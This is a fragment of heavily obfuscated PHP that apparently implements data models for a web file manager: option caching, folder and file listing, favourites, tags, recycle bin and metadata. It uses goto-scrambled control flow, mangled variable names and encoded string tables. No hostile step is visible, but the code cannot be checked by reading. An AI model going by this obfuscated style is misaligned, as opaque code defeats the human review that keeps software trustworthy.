b¸õá‰›: $A ½Œœ¼Ğ¿ = $this->client->getBucket($this->bucket, $DßóÔµ¡œŒ, null, 1); if (empty($A ½Œœ¼Ğ¿[$E£³ôŠ†¼´[208]])) { return !1; } $DŒ×¦Ãíµ = $A ½Œœ¼Ğ¿[$E£³ôŠ†¼´[208]][0][$E£³ôŠ†¼´[38]]; goto f¬ÛçƒÀíõ; e«ÕÕ½ê“ç: } } goto cˆ¶®œËÇë; aÊ³±¡²Åî: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a³†ç…ƒò = false, $F¸¤¹Ò¹Äâ = '', $DÚ»îåİ = false) { goto fÚó¯—Ïã; dÚ“–Ãâ¯: $this->cacheSet($F¸¤¹Ò¹Äâ, $E¬‹¿óõ¥); $E¬‹¿óõ¥ = array_merge($C”Åøƒ¼ˆ, $E¬‹¿óõ¥); return $a³†ç…ƒò ? $E¬‹¿óõ¥[$a³†ç…ƒò] : $E¬‹¿óõ¥; goto D–«Ú¥•; fÚó¯—Ïã: $f’¡šÃ†´‡ =& $_SERVER[£¶ä½¶¢]; $E¬‹¿óõ¥ = $this->cacheGet($F¸¤¹Ò¹Äâ); $C”Åøƒ¼ˆ = $this->optionDefault($F¸¤¹Ò¹Äâ); goto C¿Üß‚»å¡; e¬‰®ˆÁ³î: $E¬‹¿óõ¥ = $this->where($CíóÃ¿Ì)->select(); $E¬‹¿óõ¥ = array_to_keyvalue($E¬‹¿óõ¥, $f’¡šÃ†´‡[103], $f’¡šÃ†´‡[381]); foreach ($E¬‹¿óõ¥ as $aèäÅ…¡í– => $cÙ»·ß¶Ğ) { if ($DÚ»îåİ || in_array($aèäÅ…¡í–, $this->jsonField)) { $E¬‹¿óõ¥[$aèäÅ…¡í–] = json_decode($cÙ»·ß¶Ğ, !0); } } goto dÚ“–Ãâ¯; C¿Üß‚»å¡: $C”Åøƒ¼ˆ = is_array($C”Åøƒ¼ˆ) ? $C”Åøƒ¼ˆ : array(); if (is_array($E¬‹¿óõ¥)) { $E¬‹¿óõ¥ = array_merge($C”Åøƒ¼ˆ, $E¬‹¿óõ¥); return $a³†ç…ƒò ? isset($E¬‹¿óõ¥[$a³†ç…ƒò]) ? $E¬‹¿óõ¥[$a³†ç…ƒò] : null : $E¬‹¿óõ¥; } $CíóÃ¿Ì = $this->filterWhere(array($f’¡šÃ†´‡[39] => $F¸¤¹Ò¹Äâ)); goto e¬‰®ˆÁ³î; D–«Ú¥•: } public function set($c…ÙÌ„‘×, $eˆ”¨ä®Æ = false, $dÜ¥Ëõä = '') { goto D‘˜êÆœ–; cæ‚³¾’ÂÌ: return $this->addAll($eè™ù‡ë§×, array(), !0); goto A­Á’Úê‰; A¥‡”í³«Š: $d×÷¢ë¬÷ = is_array($c…ÙÌ„‘×) ? $c…ÙÌ„‘× : array($c…ÙÌ„‘× => $eˆ”¨ä®Æ); foreach ($d×÷¢ë¬÷ as $d²¯òáğ => $c†‰ºŒ–Ÿ) { if (is_array($c†‰ºŒ–Ÿ)) { $c†‰ºŒ–Ÿ = json_encode_force($c†‰ºŒ–Ÿ); } $this->checkLength($c†‰ºŒ–Ÿ, !1, $this->tableName . $C÷‰ì†ç›[14] . $c…ÙÌ„‘×); $c†‰ºŒ–Ÿ = self::textEncode($c†‰ºŒ–Ÿ); $d×÷¢ë¬÷ = array($C÷‰ì†ç›[39] => $dÜ¥Ëõä, $C÷‰ì†ç›[103] => $d²¯òáğ, $C÷‰ì†ç›[381] => $c†‰ºŒ–Ÿ); $eè™ù‡ë§×[] = $this->filterWhere($d×÷¢ë¬÷); } if (!$eè™ù‡ë§×) { return !0; } goto cæ‚³¾’ÂÌ; D‘˜êÆœ–: $C÷‰ì†ç› =& $_SERVER[£¶ä½¶¢]; $this->cacheRemove($dÜ¥Ëõä); $eè™ù‡ë§× = array(); goto A¥‡”í³«Š; A­Á’Úê‰: } protected function optionDefault($c™òª¥Ö— = '') { return !1; } public function setDeep($Cê¼âñ¥›, $fñ´¨Ğ„®Ì = false, $AóÜ…†½œ = '') { $a›ùç¾ÇŒø = explode($_SERVER[£¶ä½¶¢][105], $Cê¼âñ¥›); $Bæª›‰“Ÿ‚ = $this->get(); array_set_value($Bæª›‰“Ÿ‚, $Cê¼âñ¥›, $fñ´¨Ğ„®Ì); $this->set($a›ùç¾ÇŒø[0], $Bæª›‰“Ÿ‚[$a›ùç¾ÇŒø[0]], $AóÜ…†½œ); } public function remove($e÷·ë‹ÅÙ³, $F‘”Ïˆ’ñØ = '') { $f …–­ÌÌ® =& $_SERVER[£¶ä½¶¢]; $this->cacheRemove($F‘”Ïˆ’ñØ); $e™´‹‡Êİ = $this->filterWhere(array($f …–­ÌÌ®[103] => $e÷·ë‹ÅÙ³, $f …–­ÌÌ®[39] => $F‘”Ïˆ’ñØ)); if (is_null($e÷·ë‹ÅÙ³)) { unset($e™´‹‡Êİ[$f …–­ÌÌ®[103]]); } return $this->where($e™´‹‡Êİ)->delete(); } public function cacheSet($b‹ÜÜ†¹¯, $eÑİ‘ºÍÚ» = false) { return Cache::set($this->cacheKey($b‹ÜÜ†¹¯), $eÑİ‘ºÍÚ»); } public function cacheGet($BÂàƒ£ãŠ) { return Cache::get($this->cacheKey($BÂàƒ£ãŠ)); } public function cacheRemove($DŒ«°¢ä™) { return Cache::remove($this->cacheKey($DŒ«°¢ä™)); } protected function filterWhere($Aˆ‰²Ç¥ˆ) { return $Aˆ‰²Ç¥ˆ; } protected function cacheKey($cà“½ˆñÁÔ) { return $cà“½ˆñÁÔ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\143\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\155\x65" => "\151\157\137\x73\x6f\x75\x72\143\145\x5f\x6d\145\164\141", "\155\x65\164\x61\106\x69\145\x6c\x64" => "\163\x6f\165\162\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\143\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\145\162\x74", "\146\165\x6e\x63\164\x69\157\x6e"), array("\x76\x69\x65\x77\124\151\x6d\145", "\x74\x69\155\145", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b¢¥ØÅÌù‡) { return $this->listSource(array($_SERVER[£¶ä½¶¢][402] => $b¢¥ØÅÌù‡)); } public function typeName($B´×İØ…ïö) { static $cøÍÊ¥ë«‰ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $cøÍÊ¥ë«‰[$B´×İØ…ïö . $_SERVER[£¶ä½¶¢][43]]; } public function sourceListInfo($B‘ï Œ¸Ø¸, $B“¦ÆÎË‡º = false) { goto f¼©’¸Ğ±Â; f¼©’¸Ğ±Â: $fÌö¡˜•¡î =& $_SERVER[£¶ä½¶¢]; $B‘ï Œ¸Ø¸ = $B‘ï Œ¸Ø¸ ? $B‘ï Œ¸Ø¸ : array(); $B‘ï Œ¸Ø¸ = array_filter(array_unique($B‘ï Œ¸Ø¸)); goto c»ƒ‰©¹êÆ; BØ¢‚ÃÉ›: return array_to_keyvalue($AÃíô–¬Ó’, $fÌö¡˜•¡î[403]); goto bŞ…Ñî­ë¹; c»ƒ‰©¹êÆ: if (!$B‘ï Œ¸Ø¸) { return array(); } $AÃíô–¬Ó’ = $this->where(array($fÌö¡˜•¡î[403] => array($fÌö¡˜•¡î[17], $B‘ï Œ¸Ø¸)))->select(); $this->_listDataApply($AÃíô–¬Ó’, $B“¦ÆÎË‡º); goto BØ¢‚ÃÉ›; bŞ…Ñî­ë¹: } public function pathInfoFilter(&$Dî³¼ã¼Ã³) { goto F“èŒé×±; f™Ê“èÈİî: static $C†÷‚ô‹ã° = false; if (!$E®¯Ÿ„ß¥) { goto CÃ¦âõ¾Œå; CÃ¦âõ¾Œå: $e¡èÁ‰Öµ‘ = $c¯Ôñ™„ÌÕ[404]; $e¡èÁ‰Öµ‘ .= $c¯Ôñ™„ÌÕ[405]; $e¡èÁ‰Öµ‘ .= $c¯Ôñ™„ÌÕ[406]; goto B²å–‚ù²ø; fğâ‰¹îÂŒ: $B‘ÒÑøÊÔ± = array(); foreach ($E®¯Ÿ„ß¥ as $AÇµ«’—¦Ï) { if (in_array($AÇµ«’—¦Ï, $a¢–ŞÑÀè)) { continue; } $B‘ÒÑøÊÔ±[] = $AÇµ«’—¦Ï; } $C†÷‚ô‹ã° = explode($c¯Ôñ™„ÌÕ[57], $c¯Ôñ™„ÌÕ[408]); goto A²ØãÔÅ”×; B²å–‚ù²ø: $a‘Ë¼ë­¸ = $c¯Ôñ™„ÌÕ[407]; $a¢–ŞÑÀè = explode($c¯Ôñ™„ÌÕ[57], $a‘Ë¼ë­¸); $E®¯Ÿ„ß¥ = explode($c¯Ôñ™„ÌÕ[57], $e¡èÁ‰Öµ‘); goto fğâ‰¹îÂŒ; A²ØãÔÅ”×: } foreach ($C†÷‚ô‹ã° as $fÆÚ´˜óŠø) { if (isset($Dî³¼ã¼Ã³[$fÆÚ´˜óŠø])) { $Dî³¼ã¼Ã³[$fÆÚ´˜óŠø] = intval($Dî³¼ã¼Ã³[$fÆÚ´˜óŠø]); } } goto Fó›¯à²ß; b°ß‹“¼ê˜: if ($Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[411]] != 1) { $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[178]] = $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[413]]; unset($Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[413]]); } $A¥¦¯Ğ°Ï = $E®¯Ÿ„ß¥; if (isset($Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[414]]) && $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[414]][$c¯Ôñ™„ÌÕ[415]] == -1) { $A¥¦¯Ğ°Ï = $B‘ÒÑøÊÔ±; } goto fÚÊ¤ƒô¹; F“èŒé×±: $c¯Ôñ™„ÌÕ =& $_SERVER[£¶ä½¶¢]; static $E®¯Ÿ„ß¥ = false; static $B‘ÒÑøÊÔ± = false; goto f™Ê“èÈİî; Fó›¯à²ß: $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[86]] = $c¯Ôñ™„ÌÕ[409] . $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[403]] . $c¯Ôñ™„ÌÕ[410]; $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[39]] = $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[411]] == 1 ? $c¯Ôñ™„ÌÕ[87] : $c¯Ôñ™„ÌÕ[203]; $Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[412]] = $this->typeName($Dî³¼ã¼Ã³[$c¯Ôñ™„ÌÕ[412]]); goto b°ß‹“¼ê˜; fÚÊ¤ƒô¹: $Dî³¼ã¼Ã³ = array_field_key($Dî³¼ã¼Ã³, $A¥¦¯Ğ°Ï); return $Dî³¼ã¼Ã³; goto e†‘îÎœÆ; e†‘îÎœÆ: } public function listUserFav() { goto FÙ¤­›©÷; b‰õÛÎ‹ª: $b®ˆÙÏš• = array_to_keyvalue($b®ˆÙÏš•, $d‰å´Şøµ½[43], $d‰å´Şøµ½[86]); if ($b®ˆÙÏš•) { $có‚´­ì—” = $this->listSource(array($d‰å´Şøµ½[418] => array($d‰å´Şøµ½[419], $b®ˆÙÏš•))); } $có‚´­ì—” = array_to_keyvalue($có‚´­ì—”[$d‰å´Şøµ½[376]], $d‰å´Şøµ½[403]); goto bÛÌ‹‰¥®‹; FÙ¤­›©÷: $d‰å´Şøµ½ =& $_SERVER[£¶ä½¶¢]; $eÎ£¶Š¾Ø¼ = Model($d‰å´Şøµ½[416])->listData(); $b®ˆÙÏš• = array_filter_by_field($eÎ£¶Š¾Ø¼, $d‰å´Şøµ½[39], $d‰å´Şøµ½[417]); goto b‰õÛÎ‹ª; bÛÌ‹‰¥®‹: foreach ($eÎ£¶Š¾Ø¼ as &$e·¬Ç„ÍÕŒ) { $e·¬Ç„ÍÕŒ = array($d‰å´Şøµ½[420] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[401]], $d‰å´Şøµ½[421] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[38]], $d‰å´Şøµ½[422] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[86]], $d‰å´Şøµ½[423] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[39]], $d‰å´Şøµ½[424] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[204]], $d‰å´Şøµ½[425] => $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[94]]); if ($e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[39]] == $d‰å´Şøµ½[417] && $có‚´­ì—”[$e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[86]]]) { $e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[95]] = $có‚´­ì—”[$e·¬Ç„ÍÕŒ[$d‰å´Şøµ½[86]]]; } } unset($e·¬Ç„ÍÕŒ); return $eÎ£¶Š¾Ø¼; goto B†Â’¡Æß; B†Â’¡Æß: } public function listUserTag($béÂ›š‚) { goto fÛŠİéšÒ; D±ˆƒ†Ò’: $B¶¾”…ò·— = array(); foreach ($FÁßğ¸åÙé as $BÕÁ•‚²Âá) { $BŒÂ¢ŸÆË¢ = $BÕÁ•‚²Âá[$b¥óÉÔ[86]]; if (!$BŒÂ¢ŸÆË¢) { continue; } if (!isset($B¶¾”…ò·—[$BŒÂ¢ŸÆË¢])) { $B¶¾”…ò·—[$BŒÂ¢ŸÆË¢] = array(); } $B¶¾”…ò·—[$BŒÂ¢ŸÆË¢][] = $BÕÁ•‚²Âá[$b¥óÉÔ[427]]; } $Cšôª…ˆö = array(); goto eÊ›ŒŠÙÀÓ; eÊ›ŒŠÙÀÓ: foreach ($B¶¾”…ò·— as $aÑ¥©Ÿ© => $cƒã…”ˆŠ) { $c®ĞÀåŞ¤Ä = !0; if (!$béÂ›š‚) { $Cšôª…ˆö[] = $aÑ¥©Ÿ©; continue; } foreach ($béÂ›š‚ as $b±ãâ½Ø´ù) { if (!in_array($b±ãâ½Ø´ù, $cƒã…”ˆŠ)) { $c®ĞÀåŞ¤Ä = !1; break; } } if ($c®ĞÀåŞ¤Ä) { $Cšôª…ˆö[] = $aÑ¥©Ÿ©; } } if (!$Cšôª…ˆö) { return array(); } $d¹ÖŸˆÂ = $this->listSource(array($b¥óÉÔ[418] => array($b¥óÉÔ[419], $Cšôª…ˆö))); goto D¹¢ï ¿; D¹¢ï ¿: if (!$d¹ÖŸˆÂ || count($Cšôª…ˆö) == $d¹ÖŸˆÂ[$b¥óÉÔ[373]][$b¥óÉÔ[374]]) { return $d¹ÖŸˆÂ; } $FÖÒĞŒÂàÅ = array(); $fÅ°·Â‚ìØ = array_to_keyvalue($d¹ÖŸˆÂ[$b¥óÉÔ[85]], $b¥óÉÔ[43], $b¥óÉÔ[403]); goto C£ìØÅ†å; fÛŠİéšÒ: $b¥óÉÔ =& $_SERVER[£¶ä½¶¢]; if ($béÂ›š‚ && !is_array($béÂ›š‚)) { $béÂ›š‚ = array($béÂ›š‚); } $FÁßğ¸åÙé = Model($b¥óÉÔ[426])->listData(); goto D±ˆƒ†Ò’; C£ìØÅ†å: $B¢Ÿ®‚¹‡ = array_to_keyvalue($d¹ÖŸˆÂ[$b¥óÉÔ[84]], $b¥óÉÔ[43], $b¥óÉÔ[403]); $b””Ê¬Œ¨ = array_merge($B¢Ÿ®‚¹‡, $fÅ°·Â‚ìØ); foreach ($Cšôª…ˆö as $BŒÂ¢ŸÆË¢) { if (!in_array($BŒÂ¢ŸÆË¢, $b””Ê¬Œ¨)) { $FÖÒĞŒÂàÅ[] = $BŒÂ¢ŸÆË¢; } } goto fÜ‹¸­³·Û; fÜ‹¸­³·Û: if ($FÖÒĞŒÂàÅ) { Model($b¥óÉÔ[428])->removeBySource($FÖÒĞŒÂàÅ); } return $d¹ÖŸˆÂ; goto aèŞ÷œïÀ; aèŞ÷œïÀ: } public function listUserRecycle() { $D“¤íÒƒ › =& $_SERVER[£¶ä½¶¢]; $eÜ˜ˆï¬©  = Model($D“¤íÒƒ ›[429])->listData(); if (!$eÜ˜ˆï¬© ) { return array(); } $B“ĞÃÏİ…‡ = array($D“¤íÒƒ ›[418] => array($D“¤íÒƒ ›[419], $eÜ˜ˆï¬© ), $D“¤íÒƒ ›[430] => 1); return $this->listSource($B“ĞÃÏİ…‡); } public function listSource($bÏ´Ÿ«¸ªµ, $aé¥ôè’ìÊ = 3000) { goto c˜§Š¬ §; d“•¯ËËÅ¢: $b«‰‹ÁßŠ‚ = $this->field($d‰øËÓÏ”)->_makeOrder()->where($bÏ´Ÿ«¸ªµ)->selectPage($aé¥ôè’ìÊ); $this->_listDataApply($b«‰‹ÁßŠ‚[$e¾ßƒ½ÑÕã[376]]); $this->_listMake($b«‰‹ÁßŠ‚); goto f²Ê¨Ï·; f²Ê¨Ï·: return $b«‰‹ÁßŠ‚; goto EŒ©×ì¾ß; c˜§Š¬ §: $e¾ßƒ½ÑÕã =& $_SERVER[£¶ä½¶¢]; if (!isset($bÏ´Ÿ«¸ªµ[$e¾ßƒ½ÑÕã[431]])) { $bÏ´Ÿ«¸ªµ[$e¾ßƒ½ÑÕã[431]] = 0; } $d‰øËÓÏ” = $e¾ßƒ½ÑÕã[432]; goto d“•¯ËËÅ¢; EŒ©×ì¾ß: } protected function _makeOrder() { goto FåñŸÓâŞ‰; FµŒª¨¶: if ($f¶ù­°—è == $eİŒ™ã…¹[38]) { } $FÅ™íÛ’‰ = $eİŒ™ã…¹[445] . $C¯÷Œ×Ø[$f¶ù­°—è] . $eİŒ™ã…¹[60] . $f¸“÷à‘ˆ[$C«Õ‡¡Öœ]; return $this->order(rtrim(trim($FÅ™íÛ’‰), $eİŒ™ã…¹[57])); goto DäìàÒóÉ½; BµäÙŞïÈß: $C«Õ‡¡Öœ = Input::get($eİŒ™ã…¹[444], $eİŒ™ã…¹[17], $F¥ˆá©š‚ê, array_keys($f¸“÷à‘ˆ)); if (!in_array($f¶ù­°—è, array_keys($C¯÷Œ×Ø))) { $f¶ù­°—è = $eİŒ™ã…¹[38]; } if (!in_array($C«Õ‡¡Öœ, array_keys($f¸“÷à‘ˆ))) { $f¶ù­°—è = $eİŒ™ã…¹[436]; } goto FµŒª¨¶; cšÛ´ºö•¡: $f¸“÷à‘ˆ = array($eİŒ™ã…¹[436] => $eİŒ™ã…¹[437], $eİŒ™ã…¹[438] => $eİŒ™ã…¹[439]); $C¯÷Œ×Ø = array($eİŒ™ã…¹[38] => $eİŒ™ã…¹[38], $eİŒ™ã…¹[88] => $eİŒ™ã…¹[88], $eİŒ™ã…¹[178] => $eİŒ™ã…¹[413], $eİŒ™ã…¹[440] => $eİŒ™ã…¹[440], $eİŒ™ã…¹[441] => $eİŒ™ã…¹[442], $eİŒ™ã…¹[204] => $eİŒ™ã…¹[204], $eİŒ™ã…¹[94] => $eİŒ™ã…¹[94]); $f¶ù­°—è = Input::get($eİŒ™ã…¹[443], $eİŒ™ã…¹[17], $DéàˆĞİ³İ, array_keys($C¯÷Œ×Ø)); goto BµäÙŞïÈß; FåñŸÓâŞ‰: $eİŒ™ã…¹ =& $_SERVER[£¶ä½¶¢]; $DéàˆĞİ³İ = Model($eİŒ™ã…¹[433])->get($eİŒ™ã…¹[434]); $F¥ˆá©š‚ê = Model($eİŒ™ã…¹[433])->get($eİŒ™ã…¹[435]); goto cšÛ´ºö•¡; DäìàÒóÉ½: } protected function _listDataApplyItem($Cáâƒà¶©Î, $FëˆöÅĞÙ÷ = false) { $E Öë¼ä®ë = array($Cáâƒà¶©Î); $this->_listDataApply($E Öë¼ä®ë, $FëˆöÅĞÙ÷); return $E Öë¼ä®ë[0]; } protected function _listDataApply(&$eëÁáÓËéë, $eÎîïË¤íÏ = false) { goto EÂè‹è“Ü°; EÂè‹è“Ü°: $BèĞÑ·‰íä =& $_SERVER[£¶ä½¶¢]; if (!$eëÁáÓËéë) { $eëÁáÓËéë = array(); return; } $E¸ªÈªõç’ = array_to_keyvalue($eëÁáÓËéë, $BèĞÑ·‰íä[43], $BèĞÑ·‰íä[403]); goto aÕöÁâ ò; f¬èß¶ŸóÙ: $this->_listAppendUser($eëÁáÓËéë); $this->_listFilterInfo($eëÁáÓËéë, $eÎîïË¤íÏ); goto CÒÕ†Ê±³–; AÊÚœˆê­›: $this->_listAppendPath($eëÁáÓËéë); $this->_listAppendAuth($eëÁáÓËéë); $this->_listAppendSourceInfo($eëÁáÓËéë, $E¸ªÈªõç’); goto f¬èß¶ŸóÙ; aÕöÁâ ò: $E¸ªÈªõç’ = array_unique($E¸ªÈªõç’); $this->_listSourceCache($eëÁáÓËéë); if (!$eÎîïË¤íÏ) { $this->_listAppendMeta($eëÁáÓËéë, $E¸ªÈªõç’); $this->_listAppendFileMeta($eëÁáÓËéë, $E¸ªÈªõç’); $this->_listAppendChildren($eëÁáÓËéë, $E¸ªÈªõç’); } goto AÊÚœˆê­›; CÒÕ†Ê±³–: } protected function _listSourceCache($cå‹Û¯”ÚÒ) { $d‚öî›”ªì =& $_SERVER[£¶ä½¶¢]; foreach ($cå‹Û¯”ÚÒ as $cƒ¡õ‰‰Æ±) { self::$cacheSourceInfo[$d‚öî›”ªì[446] . $cƒ¡õ‰‰Æ±[$d‚öî›”ªì[403]]] = $cƒ¡õ‰‰Æ±; } } protected function _listFilterInfo(&$e®õí‰£¼, $bèÇÌ¡©¦ê = false) { $A©¶¿æÍÅ =& $_SERVER[£¶ä½¶¢]; foreach ($e®õí‰£¼ as &$cåÈæêÏ¸) { $cåÈæêÏ¸ = $this->pathInfoFilter($cåÈæêÏ¸); self::$cachePathInfo[$A©¶¿æÍÅ[447] . intval($bèÇÌ¡©¦ê) . $A©¶¿æÍÅ[448] . $cåÈæêÏ¸[$A©¶¿æÍÅ[403]]] = $cåÈæêÏ¸; } unset($cåÈæêÏ¸); } protected function _listMake(&$BÑ™ùç¬Å¼) { $b¥òé†ÂáÛ =& $_SERVER[£¶ä½¶¢]; $BÑ™ùç¬Å¼[$b¥òé†ÂáÛ[85]] = array(); $BÑ™ùç¬Å¼[$b¥òé†ÂáÛ[84]] = array(); foreach ($BÑ™ùç¬Å¼[$b¥òé†ÂáÛ[376]] as $F÷ì¥¶İù‚) { $f·Âñ Ú”Œ = $F÷ì¥¶İù‚[$b¥òé†ÂáÛ[411]] == 1 ? $b¥òé†ÂáÛ[85] : $b¥òé†ÂáÛ[84]; $BÑ™ùç¬Å¼[$f·Âñ Ú”Œ][] = $F÷ì¥¶İù‚; } unset($BÑ™ùç¬Å¼[$b¥òé†ÂáÛ[376]]); } protected function _listAppendMeta(&$DÊà±’ÄÕ­, $fˆ…¸á½³) { goto AÖöÜœÛó«; aÊÏÒ¦—±æ: if (!$eÍ¸´Å¬ŠÜ) { return; } $e§ÚŒÕ±é = array($b˜ùÈ¦÷ëÇ[451], $b˜ùÈ¦÷ëÇ[452]); $aòÌÊŠÑ¸Ó = array(); goto b‹èÇšÃõß; b‹èÇšÃõß: foreach ($eÍ¸´Å¬ŠÜ as $E£‚ê­ˆíø) { if (!isset($aòÌÊŠÑ¸Ó[$E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[403]]])) { $aòÌÊŠÑ¸Ó[$E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[403]]] = array(); } if (in_array($E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[103]], $e§ÚŒÕ±é)) { continue; } $aòÌÊŠÑ¸Ó[$E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[403]]][$E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[103]]] = $E£‚ê­ˆíø[$b˜ùÈ¦÷ëÇ[381]]; } foreach ($DÊà±’ÄÕ­ as &$aÍ‚‡ø¼ö£) { $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[453]] = !1; if (isset($aòÌÊŠÑ¸Ó[$aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[403]]])) { $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[453]] = $aòÌÊŠÑ¸Ó[$aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[403]]]; } if ($this->fileIsLock($aÍ‚‡ø¼ö£) && $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[414]]) { $bù¦Á¬…È÷ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[414]][$b˜ùÈ¦÷ëÇ[415]] = AuthModel::authDisable($aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[414]][$b˜ùÈ¦÷ëÇ[415]], $bù¦Á¬…È÷); $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[414]][$b˜ùÈ¦÷ëÇ[454]][$b˜ùÈ¦÷ëÇ[414]] = $aÍ‚‡ø¼ö£[$b˜ùÈ¦÷ëÇ[414]][$b˜ùÈ¦÷ëÇ[415]]; } } unset($aÍ‚‡ø¼ö£); goto aŞàôÒÅ¢; AÖöÜœÛó«: $b˜ùÈ¦÷ëÇ =& $_SERVER[£¶ä½¶¢]; $aãƒ›ƒÚì = array($b˜ùÈ¦÷ëÇ[418] => array($b˜ùÈ¦÷ëÇ[419], $fˆ…¸á½³)); $eÍ¸´Å¬ŠÜ = Model($b˜ùÈ¦÷ëÇ[449])->field($b˜ùÈ¦÷ëÇ[450])->where($aãƒ›ƒÚì)->select(); goto aÊÏÒ¦—±æ; aŞàôÒÅ¢: } protected function _listAppendFileMeta(&$FƒïŞõÖ¬, $Dˆ»ïÉğ³°) { goto b’«ÓÎçà; C­Œù†Äà: $AÓ¾ ˜“ê = $AÓ¾ ˜“ê ? $AÓ¾ ˜“ê : array(); $Fô›Œ™‰‹® = array(); foreach ($AÓ¾ ˜“ê as $BÖóê¡è¨œ) { if (!isset($Fô›Œ™‰‹®[$BÖóê¡è¨œ[$fŒç«äÂ¡‚[455]]])) { $Fô›Œ™‰‹®[$BÖóê¡è¨œ[$fŒç«äÂ¡‚[455]]] = array(); } $Fô›Œ™‰‹®[$BÖóê¡è¨œ[$fŒç«äÂ¡‚[455]]][$BÖóê¡è¨œ[$fŒç«äÂ¡‚[103]]] = $BÖóê¡è¨œ[$fŒç«äÂ¡‚[381]]; } goto A×³¥˜´èç; bË‘‚‚§Œ: $E©àÔ·Ó› = Model($fŒç«äÂ¡‚[458])->field($aÌøîÖ·¼É)->where($DîŒ¬ˆ‰Å)->select(); $E©àÔ·Ó› = array_to_keyvalue($E©àÔ·Ó›, $fŒç«äÂ¡‚[455]); $AÓ¾ ˜“ê = Model($fŒç«äÂ¡‚[459])->field($fŒç«äÂ¡‚[460])->where($DîŒ¬ˆ‰Å)->select(); goto C­Œù†Äà; Bâğ¬—ãÆª: if (!$fÉš‰×­Ş) { return; } $DîŒ¬ˆ‰Å = array($fŒç«äÂ¡‚[456] => array($fŒç«äÂ¡‚[419], $fÉš‰×­Ş)); $aÌøîÖ·¼É = $fŒç«äÂ¡‚[457]; goto bË‘‚‚§Œ; A×³¥˜´èç: foreach ($FƒïŞõÖ¬ as &$cÅÃ–·ŠÄ) { goto FĞ¯·“Ïƒ; FĞ¯·“Ïƒ: $Cã¡Ä¯ªó· = $cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[455]]; if (!$Cã¡Ä¯ªó· || !is_array($E©àÔ·Ó›[$Cã¡Ä¯ªó·])) { continue; } $b¢À¼ñá½İ = $E©àÔ·Ó›[$Cã¡Ä¯ªó·]; goto CÇ¹‘å°¨; D¥èœÈ”•¯: unset($E©àÔ·Ó›[$Cã¡Ä¯ªó·][$fŒç«äÂ¡‚[86]]); $Cà”‡É¯âÎ = is_array($Fô›Œ™‰‹®[$Cã¡Ä¯ªó·]) ? $Fô›Œ™‰‹®[$Cã¡Ä¯ªó·] : array(); $cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[174]] = array_merge($Cà”‡É¯âÎ, $E©àÔ·Ó›[$Cã¡Ä¯ªó·]); goto Eİ¸½™ÅòŞ; CÇ¹‘å°¨: $b¢À¼ñá½İ[$fŒç«äÂ¡‚[88]] = $cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[88]]; $b¢À¼ñá½İ[$fŒç«äÂ¡‚[38]] = $cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[38]]; if (!isset(self::$cacheFileInfo[$fŒç«äÂ¡‚[461] . $Cã¡Ä¯ªó·])) { self::$cacheFileInfo[$fŒç«äÂ¡‚[461] . $Cã¡Ä¯ªó·] = array_merge(array(), $b¢À¼ñá½İ); } goto D¥èœÈ”•¯; Eİ¸½™ÅòŞ: if (isset($cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[174]][$fŒç«äÂ¡‚[173]])) { $cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[173]] = json_decode($cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[174]][$fŒç«äÂ¡‚[173]], !0); 